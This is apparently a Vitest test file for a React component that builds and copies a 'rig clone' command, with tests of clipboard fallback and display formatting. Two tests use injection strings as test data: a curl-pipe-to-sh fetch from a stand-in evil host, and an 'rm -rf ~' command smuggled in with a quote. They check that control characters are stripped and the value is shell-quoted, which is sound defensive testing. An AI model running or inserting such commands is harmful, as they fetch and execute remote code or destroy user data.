import { render, screen, fireEvent, waitFor, cleanup } from '@testing-library/react';
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

// Mock hooks before importing the component
vi.mock('@/hooks/use-rig-config', () => ({
  useRigConfig: () => ({
    relayUrl: 'wss://relay.devnet.toonprotocol.dev',
    repoFilter: undefined,
    owner: undefined,
  }),
}));

import {
  CloneInstructions,
  buildCloneCommand,
  buildDisplayCommand,
} from '@/components/clone-instructions';
import type { RepoMetadata } from '../../nip34-parsers.js';

const OWNER = 'a'.repeat(64);

function createRepoMetadata(overrides: Partial<RepoMetadata> = {}): RepoMetadata {
  return {
    repoId: 'test-repo',
    name: 'test-repo',
    description: 'A test repository',
    ownerPubkey: OWNER,
    defaultBranch: 'main',
    eventId: 'evt1',
    cloneUrls: [],
    webUrls: [],
    maintainers: [],
    ...overrides,
  };
}

function openPopover() {
  // The clone trigger is the GitHub-style green "Code" button (was "Clone").
  fireEvent.click(screen.getByRole('button', { name: /^code$/i }));
}

describe('[P1] CloneInstructions', () => {
  const writeText = vi.fn<[string], Promise<void>>();

  beforeEach(() => {
    vi.clearAllMocks();
    writeText.mockResolvedValue(undefined);
    Object.defineProperty(navigator, 'clipboard', {
      configurable: true,
      value: { writeText },
    });
  });

  afterEach(() => {
    // No vitest `globals` in this suite, so testing-library's automatic
    // cleanup never registers — unmount explicitly or portaled popover
    // content leaks across tests.
    cleanup();
    // @ts-expect-error test-only cleanup of the clipboard stub
    delete navigator.clipboard;
  });

  it('buildCloneCommand produces the paste-and-run free clone command', () => {
    // Just the clone command — the `rig` install is documented via the CLI
    // docs link, not baked into the copied command (mirrors GitHub's clone box).
    expect(buildCloneCommand('my-repo', OWNER, 'ws://localhost:7100')).toBe(
      `rig clone ws://localhost:7100 ${OWNER}/my-repo`,
    );
  });

  it('strips control characters from the repo id so a pasted command cannot gain extra lines', () => {
    const malicious = 'legit-repo\ncurl -s https://evil.example/payload.sh | sh';
    const command = buildCloneCommand(malicious, OWNER, 'ws://localhost:7100');

    // Still exactly one line — the embedded newline must not become a second
    // executable line on paste.
    expect(command.split('\n')).toHaveLength(1);
    // The owner/repo argument (which now contains spaces/pipes) gets
    // single-quoted into one literal shell word.
    expect(command).toContain(
      `rig clone ws://localhost:7100 '${OWNER}/legit-repocurl -s https://evil.example/payload.sh | sh'`,
    );
  });

  it('shell-quotes values outside the safe charset, escaping embedded single quotes', () => {
    const command = buildCloneCommand("it's; rm -rf ~", OWNER, 'ws://localhost:7100');
    expect(command).toContain(`rig clone ws://localhost:7100 '${OWNER}/it'\\''s; rm -rf ~'`);
  });

  it('renders a display command with the owner pubkey abbreviated (full command in title)', () => {
    render(<CloneInstructions metadata={createRepoMetadata({ repoId: 'rig-demo' })} />);
    openPopover();

    const command = document.querySelector('pre');
    expect(command).not.toBeNull();
    // Displayed: abbreviated owner so the one-line box stays readable and
    // never runs under the copy button.
    expect(command?.textContent).toContain(
      `rig clone wss://relay.devnet.toonprotocol.dev ${OWNER.slice(0, 8)}…${OWNER.slice(-4)}/rig-demo`,
    );
    expect(command?.textContent).not.toContain(OWNER);
    // The FULL command stays reachable on the box itself for hover/selection.
    expect(command?.getAttribute('title')).toBe(
      `rig clone wss://relay.devnet.toonprotocol.dev ${OWNER}/rig-demo`,
    );
    // The npm install line is no longer part of the copied command.
    expect(command?.textContent).not.toContain('npm i -g');
  });

  it('buildDisplayCommand abbreviates the owner and strips control characters without quoting', () => {
    expect(buildDisplayCommand('my-repo', OWNER, 'ws://localhost:7100')).toBe(
      `rig clone ws://localhost:7100 ${OWNER.slice(0, 8)}…${OWNER.slice(-4)}/my-repo`,
    );
    // Display-only: control chars are stripped but nothing is shell-quoted.
    expect(
      buildDisplayCommand('evil\nrepo', OWNER, 'ws://localhost:7100'),
    ).toBe(
      `rig clone ws://localhost:7100 ${OWNER.slice(0, 8)}…${OWNER.slice(-4)}/evilrepo`,
    );
    // Short owners (not pubkey-shaped) are left intact.
    expect(buildDisplayCommand('r', 'shortname', 'ws://localhost:7100')).toBe(
      'rig clone ws://localhost:7100 shortname/r',
    );
  });

  it('notes that reads are free and links the rig CLI docs', () => {
    render(<CloneInstructions metadata={createRepoMetadata()} />);
    openPopover();

    expect(screen.getByText(/reads on toon are free/i)).toBeInTheDocument();
    expect(screen.getByText(/no toon identity needed/i)).toBeInTheDocument();
    const docsLink = screen.getByRole('link', { name: /rig cli docs/i });
    expect(docsLink).toHaveAttribute(
      'href',
      'https://github.com/toon-protocol/toon-client/tree/main/packages/rig#readme',
    );
  });

  it('copies the full command to the clipboard and flips to copied state', async () => {
    const metadata = createRepoMetadata({ repoId: 'rig-demo' });
    render(<CloneInstructions metadata={metadata} />);
    openPopover();

    fireEvent.click(screen.getByRole('button', { name: 'Copy clone command' }));

    expect(writeText).toHaveBeenCalledWith(
      buildCloneCommand('rig-demo', OWNER, 'wss://relay.devnet.toonprotocol.dev'),
    );
    await waitFor(() => {
      expect(
        screen.getByRole('button', { name: /copy clone command — copied/i }),
      ).toBeInTheDocument();
    });
  });

  it('falls back to execCommand when the async Clipboard API is blocked', async () => {
    writeText.mockRejectedValue(new Error('NotAllowedError'));
    const execCommand = vi.fn().mockReturnValue(true);
    Object.defineProperty(document, 'execCommand', {
      configurable: true,
      value: execCommand,
    });

    render(<CloneInstructions metadata={createRepoMetadata()} />);
    openPopover();
    fireEvent.click(screen.getByRole('button', { name: 'Copy clone command' }));

    await waitFor(() => {
      expect(execCommand).toHaveBeenCalledWith('copy');
      expect(
        screen.getByRole('button', { name: /copy clone command — copied/i }),
      ).toBeInTheDocument();
    });

    // @ts-expect-error test-only cleanup of the execCommand stub
    delete document.execCommand;
  });
});
